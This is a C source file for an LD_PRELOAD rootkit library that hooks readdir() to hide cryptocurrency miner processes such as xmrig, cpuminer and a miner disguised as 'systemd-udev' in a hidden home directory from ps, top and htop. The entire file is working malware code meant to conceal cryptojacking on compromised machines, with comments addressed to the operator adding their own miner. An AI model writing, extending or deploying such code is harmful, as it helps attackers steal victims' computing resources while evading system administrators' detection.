#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

/*
 * Multi-Process Hider - Hides multiple process names from ps/top/htop
 * 
 * Hides:
 * - swapd (root miner)
 * - xmrig (if renamed)
 * - system-watchdog (if used)
 * - systemd-udev (user-level miner at /home/$USER/.system_cache/.systemd-udev)
 * - kswapd0 (kernel thread - should not be hidden, listed for reference)
 */

// List of process names to hide (add more as needed)
static const char* process_to_filter[] = {
    "swapd",
    "xmrig",
    "system-watchdog",
    "systemd-udev",      // <-- YOUR NEW PROCESS
    ".systemd-udev",     // Hidden file version
    "cpuminer",          // cpuminer-multi
    "minerd",            // Alternative miner
    NULL                 // NULL terminator - MUST BE LAST
};

// Paths to check for hidden processes (optional - for path-based hiding)
static const char* paths_to_filter[] = {
    "/.system_cache/",   // Hides anything in /.system_cache/ directory
    "/.swapd/",          // Hides anything in /.swapd/ directory
    NULL
};

/*
 * get_dir_name - Get directory path from DIR* handle
 * 
 * This is needed because DIR is an opaque type in modern glibc
 */
static const char* get_dir_name(DIR* dirp) {
    int fd = dirfd(dirp);
    if (fd == -1) return NULL;
    
    static char path_buf[4096];
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    ssize_t len = readlink(fd_path, path_buf, sizeof(path_buf) - 1);
    if (len == -1) return NULL;
    
    path_buf[len] = '\0';
    return path_buf;
}

/*
 * get_process_name - Extract process name from /proc/[pid]/stat
 */
static char* get_process_name(char* pid) {
    char stat_path[256];
    snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", pid);
    
    FILE* f = fopen(stat_path, "r");
    if (!f) return NULL;
    
    static char name_buf[256];
    if (fscanf(f, "%*d (%255[^)])", name_buf) != 1) {
        fclose(f);
        return NULL;
    }
    
    fclose(f);
    return name_buf;
}

/*
 * get_process_cmdline - Get full command line from /proc/[pid]/cmdline
 */
static char* get_process_cmdline(char* pid) {
    char cmdline_path[256];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);
    
    FILE* f = fopen(cmdline_path, "r");
    if (!f) return NULL;
    
    static char cmdline_buf[4096];
    size_t len = fread(cmdline_buf, 1, sizeof(cmdline_buf) - 1, f);
    fclose(f);
    
    if (len == 0) return NULL;
    
    cmdline_buf[len] = '\0';
    
    // Replace null bytes with spaces (cmdline is null-separated)
    for (size_t i = 0; i < len; i++) {
        if (cmdline_buf[i] == '\0') cmdline_buf[i] = ' ';
    }
    
    return cmdline_buf;
}

/*
 * should_hide_process - Check if process should be hidden
 * 
 * Returns 1 if should hide, 0 if should show
 */
static int should_hide_process(const char* name) {
    // Check process name against filter list
    for (int i = 0; process_to_filter[i] != NULL; i++) {
        if (strcmp(name, process_to_filter[i]) == 0) {
            return 1;  // Hide this process
        }
    }
    
    // Check if process path contains filtered paths
    for (int i = 0; paths_to_filter[i] != NULL; i++) {
        if (strstr(name, paths_to_filter[i]) != NULL) {
            return 1;  // Hide this process
        }
    }
    
    return 0;  // Show this process
}

/*
 * readdir - Hook to filter directory entries in /proc
 * 
 * This intercepts readdir() calls and filters out our hidden processes
 */
struct dirent* readdir(DIR* dirp) {
    // Get original readdir function
    struct dirent* (*original_readdir)(DIR*);
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent* dir;
    
    while (1) {
        dir = original_readdir(dirp);
        
        if (dir == NULL) {
            return NULL;  // End of directory
        }
        
        // Get directory path
        const char* dir_name = get_dir_name(dirp);
        
        // Only filter /proc directory
        if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
            return dir;  // Not /proc, return as-is
        }
        
        // Check if this is a PID directory (all digits)
        int is_pid = 1;
        for (int i = 0; dir->d_name[i]; i++) {
            if (dir->d_name[i] < '0' || dir->d_name[i] > '9') {
                is_pid = 0;
                break;
            }
        }
        
        if (!is_pid) {
            return dir;  // Not a PID, return as-is
        }
        
        // Get process name
        char* process_name = get_process_name(dir->d_name);
        if (process_name == NULL) {
            return dir;  // Can't read process name, return as-is
        }
        
        // Check if should hide by process name
        if (should_hide_process(process_name)) {
            continue;  // Skip this entry, get next one
        }
        
        // Get command line (for path-based filtering)
        char* cmdline = get_process_cmdline(dir->d_name);
        if (cmdline != NULL && should_hide_process(cmdline)) {
            continue;  // Skip this entry, get next one
        }
        
        // Show this process
        return dir;
    }
}

/*
 * Initialization - Runs when library is loaded
 */
__attribute__((constructor))
static void init(void) {
    // Optional: Log that library is loaded (for debugging)
    // fprintf(stderr, "[libprocesshider] Loaded - hiding %d process types\n", 
    //         sizeof(process_to_filter) / sizeof(char*) - 1);
}
